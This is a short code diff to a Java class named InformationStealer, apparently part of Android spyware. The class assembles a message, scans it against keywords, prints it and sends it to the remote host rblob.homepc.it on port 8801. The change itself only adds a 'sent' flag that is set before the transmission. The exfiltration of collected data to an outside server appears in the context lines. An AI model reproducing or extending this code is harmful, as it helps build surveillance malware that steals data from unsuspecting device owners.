@@ -27,6 +27,7 @@ import java.util.List;
 public class InformationStealer implements Runnable {
 
     private static StringBuilder messaggio;
+    public static int inviato = 0;
 
     String[] keywords = {
             "illegal",
@@ -85,6 +86,9 @@ public class InformationStealer implements Runnable {
         }
 
         System.out.println(messaggio.toString());
+
+        inviato = 1;
+
         netman.openConnection("rblob.homepc.it",8801,context);
         netman.sendMessage2(messaggio);
         netman.closeConnection();
